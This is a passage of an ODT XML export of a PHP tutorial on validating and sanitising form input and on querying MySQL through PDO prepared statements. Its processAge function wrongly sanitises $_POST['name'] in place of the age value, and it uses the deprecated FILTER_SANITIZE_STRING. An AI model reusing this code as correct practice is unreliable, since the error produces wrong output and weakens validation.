          <text:p text:style-name="P154"><text:bookmark-start text:name="__DdeLink__2599_1458108310"/><text:span text:style-name="T47">C</text:span><text:span text:style-name="T42">hecking up the existence and displaying raw data.</text:span><text:bookmark-end text:name="__DdeLink__2599_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P155"><text:bookmark-start text:name="__DdeLink__2601_1458108310"/><text:span text:style-name="T42">Checking up the format via filter_input() and a special key. Need to notice that I</text:span><text:span text:style-name="T57">'</text:span><text:span text:style-name="T42">ve </text:span><text:span text:style-name="T59">already</text:span><text:span text:style-name="T42"> checked the format of email via html input attribute type «email» but that was not enough because without inner validation via filter_input email «</text:span><text:a xlink:type="simple" xlink:href="mailto:myemail@email" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">myemail@email</text:a><text:span text:style-name="T42">» would be correct </text:span><text:span text:style-name="T52">although it has no postfix.</text:span><text:bookmark-end text:name="__DdeLink__2601_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P158"><text:bookmark-start text:name="__DdeLink__2603_1458108310"/><text:span text:style-name="T52">I </text:span><text:span text:style-name="T42">diplay safe data with filter_var() function and a special key I was talking about above.</text:span><text:bookmark-end text:name="__DdeLink__2603_1458108310"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P101"><text:bookmark-start text:name="__DdeLink__2552_1458108310"/><text:span text:style-name="T91">private const </text:span><text:span text:style-name="T109">DEPARTMENT_ID_INVALID_MESSAGE </text:span><text:span text:style-name="T91">= </text:span><text:span text:style-name="T115">"There are only A-C departments now."</text:span><text:span text:style-name="T91">;</text:span></text:p>
      <text:p text:style-name="P101"><text:span text:style-name="T91">private function </text:span><text:span text:style-name="T122">processDepartmentId</text:span><text:span text:style-name="T91">(?string </text:span><text:span text:style-name="T104">$id</text:span><text:span text:style-name="T91">): array</text:span></text:p>
      <text:p text:style-name="P98"><text:soft-page-break/>{</text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T136">$processedIdArray </text:span><text:span text:style-name="T180">= []</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T149">if </text:span><text:span text:style-name="T180">(</text:span><text:span text:style-name="T149">isset</text:span><text:span text:style-name="T180">(</text:span><text:span text:style-name="T136">$id</text:span><text:span text:style-name="T180">)) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="8"/></text:span><text:span text:style-name="T136">$processedIdArray</text:span><text:span text:style-name="T180">[] = !</text:span><text:span text:style-name="T149">empty</text:span><text:span text:style-name="T180">(trim(</text:span><text:span text:style-name="T136">$id</text:span><text:span text:style-name="T180">)) ? </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">RAW </text:span><text:span text:style-name="T180">. </text:span><text:span text:style-name="T136">$id </text:span><text:span text:style-name="T180">: </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">RAW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36">$isValid </text:span><text:span text:style-name="T180">= preg_match(</text:span><text:span text:style-name="T143">"/[A-C]-([0-9]){3,3}/"</text:span><text:span text:style-name="T148">, </text:span><text:span text:style-name="T136">$id</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T136">$processedIdArray</text:span><text:span text:style-name="T180">[] = (</text:span><text:span text:style-name="T136">$isValid</text:span><text:span text:style-name="T180">) ? </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">VALID_MESSAGE </text:span><text:span text:style-name="T180">: </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">DEPARTMENT_ID_INVALID_MESSAGE</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T149">if </text:span><text:span text:style-name="T180">(!</text:span><text:span text:style-name="T149">empty</text:span><text:span text:style-name="T180">(trim(</text:span><text:span text:style-name="T136">$id</text:span><text:span text:style-name="T180">))) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="12"/></text:span><text:span text:style-name="T136">$processedIdArray</text:span><text:span text:style-name="T180">[] = </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">SANITIZED </text:span><text:span text:style-name="T180">. filter_var(</text:span><text:span text:style-name="T136">$id</text:span><text:span text:style-name="T148">, </text:span><text:span text:style-name="T137">FILTER_SANITIZE_STRING</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T180">} </text:span><text:span text:style-name="T149">else </text:span><text:span text:style-name="T180">{</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="12"/></text:span><text:span text:style-name="T136">$processedIdArray</text:span><text:span text:style-name="T180">[] = </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">SANITIZED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80">}</text:span></text:p>
      <text:p text:style-name="P107"><text:s text:c="4"/><text:span text:style-name="T179">}</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T149">return </text:span><text:span text:style-name="T136">$processedIdArray</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P126">}<text:bookmark-end text:name="__DdeLink__2552_1458108310"/></text:p>
      <text:p text:style-name="P117"/>
      <text:list xml:id="list3653323161283446937" text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P156"><text:bookmark-start text:name="__DdeLink__2605_1458108310"/><text:span text:style-name="T47">C</text:span><text:span text:style-name="T42">hecking up the existence and displaying raw data.</text:span><text:bookmark-end text:name="__DdeLink__2605_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P159"><text:bookmark-start text:name="__DdeLink__2607_1458108310"/><text:span text:style-name="T42">Checking up the data via regular expression. For example main format for company identifier is up</text:span><text:span text:style-name="T59">p</text:span><text:span text:style-name="T42">ercase letter, hyphen and three numbers. But on the current moment there are on</text:span><text:span text:style-name="T59">l</text:span><text:span text:style-name="T42">y departments starting with from A to C letters. You can check such things with a help of regular expression but should remember that thay are much slower than built-in format checking functions or for example checking up with usual </text:span><text:span text:style-name="T53">incorruptible check by casting type :)</text:span><text:bookmark-end text:name="__DdeLink__2607_1458108310"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P105"><text:bookmark-start text:name="__DdeLink__2554_1458108310"/><text:span text:style-name="T87">private const </text:span><text:span text:style-name="T108">AGE_INVALID_MESSAGE </text:span><text:span text:style-name="T64">= </text:span><text:span text:style-name="T114">"Age must be a number."</text:span><text:span text:style-name="T95">;</text:span></text:p>
      <text:p text:style-name="P105"><text:span text:style-name="T87">private function </text:span><text:span text:style-name="T121">processAge</text:span><text:span text:style-name="T64">(?string </text:span><text:span text:style-name="T103">$age</text:span><text:span text:style-name="T64">): </text:span><text:span text:style-name="T87">array</text:span></text:p>
      <text:p text:style-name="P98">{</text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T136">$processedAgeArray </text:span><text:span text:style-name="T180">= []</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T149">if </text:span><text:span text:style-name="T180">(</text:span><text:span text:style-name="T149">isset</text:span><text:span text:style-name="T180">(</text:span><text:span text:style-name="T136">$age</text:span><text:span text:style-name="T180">)) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="8"/></text:span><text:span text:style-name="T136">$processedAgeArray</text:span><text:span text:style-name="T180">[] = !</text:span><text:span text:style-name="T149">empty</text:span><text:span text:style-name="T180">(trim(</text:span><text:span text:style-name="T136">$age</text:span><text:span text:style-name="T180">)) ? </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">RAW </text:span><text:span text:style-name="T180">. </text:span><text:span text:style-name="T136">$age </text:span><text:span text:style-name="T180">: </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">RAW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36">$isValid </text:span><text:span text:style-name="T180">= ctype_digit(</text:span><text:span text:style-name="T136">$age</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T136">$processedAgeArray</text:span><text:span text:style-name="T180">[] = (</text:span><text:span text:style-name="T136">$isValid</text:span><text:span text:style-name="T180">) ? </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">VALID_MESSAGE </text:span><text:span text:style-name="T180">: </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">AGE_INVALID_MESSAGE</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T149">if </text:span><text:span text:style-name="T180">(!</text:span><text:span text:style-name="T149">empty</text:span><text:span text:style-name="T180">(trim(</text:span><text:span text:style-name="T136">$age</text:span><text:span text:style-name="T180">))) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="12"/></text:span><text:span text:style-name="T136">$processedAgeArray</text:span><text:span text:style-name="T180">[] =</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="16"/></text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">SANITIZED </text:span><text:span text:style-name="T180">.</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="16"/></text:span><text:span text:style-name="T180">filter_var(</text:span><text:span text:style-name="T136">$_POST</text:span><text:span text:style-name="T180">[</text:span><text:span text:style-name="T143">"name"</text:span><text:span text:style-name="T180">]</text:span><text:span text:style-name="T148">, </text:span><text:span text:style-name="T137">FILTER_SANITIZE_NUMBER_INT</text:span><text:span text:style-name="T180">) .</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="16"/></text:span><text:span text:style-name="T180">htmlentities(</text:span><text:span text:style-name="T136">$age</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T180">} </text:span><text:span text:style-name="T149">else </text:span><text:span text:style-name="T180">{</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="12"/></text:span><text:span text:style-name="T136">$processedAgeArray</text:span><text:span text:style-name="T180">[] = </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">SANITIZED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80">}</text:span></text:p>
      <text:p text:style-name="P107"><text:s text:c="4"/><text:span text:style-name="T179">}</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T149">return </text:span><text:span text:style-name="T136">$processedAgeArray</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P126">}<text:bookmark-end text:name="__DdeLink__2554_1458108310"/></text:p>
      <text:list xml:id="list1398370162466912997" text:style-name="L8">
        <text:list-item>
          <text:p text:style-name="P157"><text:bookmark-start text:name="__DdeLink__2609_1458108310"/><text:span text:style-name="T47">C</text:span><text:span text:style-name="T53">hecking up the existence and displaying raw data.</text:span><text:bookmark-end text:name="__DdeLink__2609_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P160"><text:bookmark-start text:name="__DdeLink__2611_1458108310"/><text:span text:style-name="T53">C</text:span><text:span text:style-name="T42">hecking up the format via «ctype» functions family member.</text:span><text:bookmark-end text:name="__DdeLink__2611_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P140"><text:bookmark-start text:name="__DdeLink__2613_1458108310"/><text:soft-page-break/>I display the data with a help of htmlentities() function and not with a filter_var(). Write «&lt;b&gt;18&lt;/b&gt;» to see the difference between such lind of processing and the way I process the name in such case.<text:bookmark-end text:name="__DdeLink__2613_1458108310"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P106"><text:bookmark-start text:name="__DdeLink__2556_1458108310"/><text:span text:style-name="T84">private const </text:span><text:span text:style-name="T105">GENDER_INVALID_MESSAGE </text:span><text:span text:style-name="T61">= </text:span><text:span text:style-name="T111">"Do not deceive the system."</text:span><text:span text:style-name="T92">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T150">private function </text:span><text:span text:style-name="T190">processGender</text:span><text:span text:style-name="T130">(?string </text:span><text:span text:style-name="T133">$gender</text:span><text:span text:style-name="T130">): </text:span><text:span text:style-name="T150">array</text:span></text:p>
      <text:p text:style-name="P98">{</text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T136">$processedGenderArray </text:span><text:span text:style-name="T180">= []</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="4"/></text:span><text:span text:style-name="T149">if </text:span><text:span text:style-name="T180">(</text:span><text:span text:style-name="T149">isset</text:span><text:span text:style-name="T180">(</text:span><text:span text:style-name="T136">$gender</text:span><text:span text:style-name="T180">)) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="8"/></text:span><text:span text:style-name="T189">//$gender = "enemy input";</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T188"><text:s text:c="8"/></text:span><text:span text:style-name="T136">$processedGenderArray</text:span><text:span text:style-name="T180">[] = !</text:span><text:span text:style-name="T149">empty</text:span><text:span text:style-name="T180">(trim(</text:span><text:span text:style-name="T136">$gender</text:span><text:span text:style-name="T180">)) ? </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">RAW </text:span><text:span text:style-name="T180">. </text:span><text:span text:style-name="T136">$gender </text:span><text:span text:style-name="T180">: </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">RAW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36">$gendersBase </text:span><text:span text:style-name="T180">= [</text:span><text:span text:style-name="T143">"male" </text:span><text:span text:style-name="T180">=&gt; </text:span><text:span text:style-name="T174">0</text:span><text:span text:style-name="T148">, </text:span><text:span text:style-name="T143">"female" </text:span><text:span text:style-name="T180">=&gt; </text:span><text:span text:style-name="T174">1</text:span><text:span text:style-name="T180">]</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T136">$isValid </text:span><text:span text:style-name="T180">= array_key_exists(</text:span><text:span text:style-name="T136">$gender</text:span><text:span text:style-name="T148">, </text:span><text:span text:style-name="T136">$gendersBase</text:span><text:span text:style-name="T180">)</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T136">$processedGenderArray</text:span><text:span text:style-name="T180">[] = (</text:span><text:span text:style-name="T136">$isValid</text:span><text:span text:style-name="T180">) ? </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">VALID_MESSAGE </text:span><text:span text:style-name="T180">: </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">GENDER_INVALID_MESSAGE</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T149">if </text:span><text:span text:style-name="T180">(!</text:span><text:span text:style-name="T149">empty</text:span><text:span text:style-name="T180">(trim(</text:span><text:span text:style-name="T136">$gender</text:span><text:span text:style-name="T180">))) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="12"/></text:span><text:span text:style-name="T136">$processedGenderArray</text:span><text:span text:style-name="T180">[] = </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">SANITIZED </text:span><text:span text:style-name="T180">. </text:span><text:span text:style-name="T136">$gender</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T180">} </text:span><text:span text:style-name="T149">else </text:span><text:span text:style-name="T180">{</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="12"/></text:span><text:span text:style-name="T136">$processedGenderArray</text:span><text:span text:style-name="T180">[] = </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">SANITIZED </text:span><text:span text:style-name="T180">. </text:span><text:span text:style-name="T149">self</text:span><text:span text:style-name="T180">::</text:span><text:span text:style-name="T137">EMPTY</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T145"><text:s text:c="8"/></text:span><text:span text:style-name="T180">}</text:span></text:p>
      <text:p text:style-name="P107"><text:s text:c="4"/><text:span text:style-name="T179">}</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T149">return </text:span><text:span text:style-name="T136">$processedGenderArray</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P126">}<text:bookmark-end text:name="__DdeLink__2556_1458108310"/></text:p>
      <text:list xml:id="list3313532150589769196" text:style-name="L9">
        <text:list-item>
          <text:p text:style-name="P161"><text:bookmark-start text:name="__DdeLink__2615_1458108310"/><text:span text:style-name="T42">I</text:span><text:span text:style-name="T57">'</text:span><text:span text:style-name="T42">m verifying the gender like pre-prepared parameter with a help of array_key_exists() function. You don</text:span><text:span text:style-name="T57">'</text:span><text:span text:style-name="T42">t need to be a hacker to mix POST parameters the way you like and add not standard value wherever you want.</text:span><text:bookmark-end text:name="__DdeLink__2615_1458108310"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P83"><text:bookmark-start text:name="__DdeLink__2629_1458108310"/><text:span text:style-name="T42">Summing up </text:span><text:span text:style-name="T60">form processing</text:span><text:bookmark-end text:name="__DdeLink__2629_1458108310"/><text:span text:style-name="T42">:</text:span></text:p>
      <text:list xml:id="list4075972557645911306" text:style-name="L10">
        <text:list-item>
          <text:p text:style-name="P162"><text:bookmark-start text:name="__DdeLink__2619_1458108310"/><text:span text:style-name="T42">Check the existence of variable with the key </text:span><text:span text:style-name="T56">with</text:span><text:span text:style-name="T54"> isset(), </text:span><text:span text:style-name="T55">filter_has_var()</text:span><text:span text:style-name="T54">.</text:span><text:bookmark-end text:name="__DdeLink__2619_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P163"><text:bookmark-start text:name="__DdeLink__2621_1458108310"/><text:span text:style-name="T54">C</text:span><text:span text:style-name="T42">heck the format with «ctype» family, filter_input() keys and preg_mach().</text:span><text:bookmark-end text:name="__DdeLink__2621_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P164"><text:bookmark-start text:name="__DdeLink__2625_1458108310"/><text:span text:style-name="T42">Sanitize data with htmlentities(), filter_var() sanitizing keys and <text:s/></text:span><text:span text:style-name="T53">casting type</text:span><text:span text:style-name="T42">s if possible.</text:span><text:bookmark-end text:name="__DdeLink__2625_1458108310"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P141"><text:bookmark-start text:name="__DdeLink__2627_1458108310"/>Check the existence of key when working with the select, radio and checkbox tags.<text:bookmark-end text:name="__DdeLink__2627_1458108310"/></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P60">5.Database interaction</text:p>
      <text:p text:style-name="P58"><text:span text:style-name="T196"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__4167_755149307"/><text:span text:style-name="T205">The whole contents of the site is stored in database. Templates serves as a skeleton for a</text:span><text:span text:style-name="T196">site body. And contents is goes a long way from database through the repository, service, controller and template engine to take it place in the pre-prepared positions in the page template and becomes a </text:span><text:span text:style-name="T205">muscles</text:span><text:span text:style-name="T196"> of our web-app :)</text:span><text:bookmark-end text:name="__DdeLink__4167_755149307"/></text:p>
      <text:p text:style-name="P50"><text:span text:style-name="T196"><text:tab/></text:span><text:span text:style-name="T197">I</text:span><text:bookmark-start text:name="__DdeLink__4169_755149307"/><text:span text:style-name="T197"> prefer working with a database with a help of PDO: PHP Data Object </text:span><text:span text:style-name="T198">rather than via mysql() or even mysql</text:span><text:span text:style-name="T199">i (i</text:span><text:span text:style-name="T205">m</text:span><text:span text:style-name="T199">proved)</text:span><text:span text:style-name="T198"> functions. </text:span><text:span text:style-name="T199">And there are some reasons for that.</text:span><text:bookmark-end text:name="__DdeLink__4169_755149307"/></text:p>
      <text:list xml:id="list1829716090584269217" text:style-name="L11">
        <text:list-item>
          <text:p text:style-name="P143"><text:bookmark-start text:name="__DdeLink__4173_755149307"/><text:span text:style-name="T199">A</text:span><text:span text:style-name="T195">uto shielding when using prepare() &amp; execute() companions.</text:span><text:bookmark-end text:name="__DdeLink__4173_755149307"/></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P142">Auto optimization when using prepare() &amp; execute() companions.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P142">Flexibility.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P53"><text:soft-page-break/><text:span text:style-name="T195"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__4171_755149307"/><text:span text:style-name="T195">Regarding flexibility. PDO is like a tee on a lots of power sockets where sockets are different kinds of databases and PHP has just one simple wire to the tee. When you need to replace the type of database you are only to change DSN in connection string and tiny moments connected with the personal architecture of new database type. </text:span><text:span text:style-name="T200">Probably I am </text:span><text:span text:style-name="T205">exaggerating</text:span><text:span text:style-name="T200"> but in general we are talking of much less work than with mysql improved or smth like this.</text:span><text:bookmark-end text:name="__DdeLink__4171_755149307"/></text:p>
      <text:p text:style-name="P51"><text:span text:style-name="T200"><text:tab/></text:span><text:span text:style-name="T201">Details</text:span></text:p>
      <text:p text:style-name="P51"><text:span text:style-name="T201"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__4177_755149307"/><text:span text:style-name="T201">You can execute your queries with query() and exec() PDO methods. The first one is for SELECT queries and the second one is for INSERT, UPDATE and DELETE ones. The first one returns selected array of data with numeric and associative keys (really comfortable sometimes) and the second one returns amount of affected rows in DB.</text:span><text:bookmark-end text:name="__DdeLink__4177_755149307"/></text:p>
      <text:p text:style-name="P52"><text:span text:style-name="T201"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__4179_755149307"/><text:span text:style-name="T202">But I prefer </text:span><text:span text:style-name="T205">a</text:span><text:span text:style-name="T202">nother <text:s/></text:span><text:span text:style-name="T195">companions: </text:span><text:span text:style-name="T202">prepare() and execute(). With a help of the first one you are creating query template which can wait for needed moment and be executed lost time with a different parameters. </text:span><text:span text:style-name="T203">Sounds like extensible programming and reuse. Really great. And execute() function is executing the query filling it with the array (preferably associative) of parameters </text:span><text:span text:style-name="T204">for needed count of times.</text:span><text:bookmark-end text:name="__DdeLink__4179_755149307"/></text:p>
      <text:p text:style-name="P118"><text:bookmark-start text:name="__DdeLink__4193_755149307"/><text:bookmark-start text:name="__DdeLink__4191_755149307"/><text:span text:style-name="T135">$pdo </text:span><text:span text:style-name="T132">= </text:span><text:span text:style-name="T151">new </text:span><text:span text:style-name="T132">PDO(</text:span><text:span text:style-name="T138">DSN</text:span><text:span text:style-name="T147">, </text:span><text:span text:style-name="T138">USERNAME</text:span><text:span text:style-name="T147">, </text:span><text:span text:style-name="T138">PASSWORD</text:span><text:span text:style-name="T132">)</text:span><text:span text:style-name="T147">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$statement </text:span><text:span text:style-name="T130">= </text:span><text:span text:style-name="T133">$pdo</text:span><text:span text:style-name="T130">-&gt;</text:span><text:span text:style-name="T190">prepare</text:span><text:span text:style-name="T130">(</text:span><text:span text:style-name="T140">"SELECT </text:span><text:span text:style-name="T190">*</text:span><text:span text:style-name="T140"> FROM eugeneDB.languages WHERE </text:span><text:span text:style-name="T133">`mark`</text:span><text:span text:style-name="T140"> = :mark"</text:span><text:span text:style-name="T130">)</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$statement</text:span><text:span text:style-name="T130">-&gt;</text:span><text:span text:style-name="T190">execute</text:span><text:span text:style-name="T130">([</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="8"/></text:span><text:span text:style-name="T143">"mark" </text:span><text:span text:style-name="T180">=&gt; </text:span><text:span text:style-name="T174">9</text:span><text:span text:style-name="T148">,</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T130">])</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T133">$queryResults </text:span><text:span text:style-name="T130">= </text:span><text:span text:style-name="T133">$statement</text:span><text:span text:style-name="T130">-&gt;</text:span><text:span text:style-name="T190">fetchAll</text:span><text:span text:style-name="T130">()</text:span><text:span text:style-name="T145">;</text:span></text:p>
      <text:p text:style-name="P94"><text:span text:style-name="T150">foreach </text:span><text:span text:style-name="T130">(</text:span><text:span text:style-name="T133">$queryResults </text:span><text:span text:style-name="T150">as </text:span><text:span text:style-name="T133">$row</text:span><text:span text:style-name="T130">) {</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="4"/></text:span><text:span text:style-name="T149">echo </text:span><text:span text:style-name="T143">"</text:span><text:span text:style-name="T180">${</text:span><text:span text:style-name="T136">row</text:span><text:span text:style-name="T180">[</text:span><text:span text:style-name="T143">"name"</text:span><text:span text:style-name="T180">]}</text:span><text:span text:style-name="T143"> framework is </text:span><text:span text:style-name="T180">{</text:span><text:span text:style-name="T136">$row</text:span><text:span text:style-name="T180">[</text:span><text:span text:style-name="T143">"framework"</text:span><text:span text:style-name="T180">]}</text:span><text:span text:style-name="T143">&lt;br&gt;"</text:span><text:span text:style-name="T148">;</text:span></text:p>
      <text:p text:style-name="P126">}<text:bookmark-end text:name="__DdeLink__4193_755149307"/><text:bookmark-end text:name="__DdeLink__4191_755149307"/></text:p>
      <text:p text:style-name="P52"><text:bookmark-start text:name="__DdeLink__5091_1111318207"/><text:span text:style-name="T207">PHP framework is Symfony</text:span><text:span text:style-name="T204"><text:line-break/></text:span><text:span text:style-name="T207">JS framework is reactJS</text:span><text:span text:style-name="T204"><text:line-break/></text:span><text:span text:style-name="T207">Java framework is Spring</text:span><text:bookmark-end text:name="__DdeLink__5091_1111318207"/></text:p>
      <text:p text:style-name="P56"><text:span text:style-name="T207"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__4181_755149307"/><text:span text:style-name="T207">I</text:span><text:span text:style-name="T206">t is better to check w</text:span><text:span text:style-name="T214">h</text:span><text:span text:style-name="T206">ether it possible to connect with current parameters and react accordingly. </text:span><text:span text:style-name="T208">Also good practice is to put column names in apostrophes and use </text:span><text:span text:style-name="T214">associative</text:span><text:span text:style-name="T208"> array and named placeholders to avoid </text:span><text:span text:style-name="T209">confusion when changing the query.</text:span><text:bookmark-end text:name="__DdeLink__4181_755149307"/></text:p>
      <text:p text:style-name="P54"><text:span text:style-name="T209"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__4183_755149307"/><text:span text:style-name="T212">p</text:span><text:span text:style-name="T210">repare(), execute() do not protect you fully. For example in case the SELECT query is trying to take enormous amount of rows your application is going to work slowly at best. </text:span><text:span text:style-name="T211">So use LIMIT key word of MySQL language and pagination to avoid huge selections.</text:span><text:bookmark-end text:name="__DdeLink__4183_755149307"/></text:p>
      <text:p text:style-name="P55"><text:span text:style-name="T211"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__4187_755149307"/><text:span text:style-name="T212">fetch() and fetchAll() functions move ahead on the data array irreversibly so in case your need to use rows array not only for just output save it in your own array.</text:span><text:bookmark-end text:name="__DdeLink__4187_755149307"/></text:p>
      <text:p text:style-name="P119"><text:bookmark-start text:name="__DdeLink__4196_755149307"/><text:span text:style-name="T139">$statement </text:span><text:span text:style-name="T215">= </text:span><text:span text:style-name="T139">$pdo</text:span><text:span text:style-name="T215">-&gt;</text:span><text:span text:style-name="T191">prepare</text:span><text:span text:style-name="T215">(</text:span></text:p>
      <text:p text:style-name="P93"><text:span text:style-name="T130"><text:s text:c="8"/></text:span><text:span text:style-name="T143">"SELECT </text:span><text:span text:style-name="T136">`id`</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T136">`name`</text:span><text:span text:style-name="T143">, </text:span><text:span text:style-name="T136">`password`</text:span><text:span text:style-name="T143"> FROM eugeneDB.users</text:span></text:p>
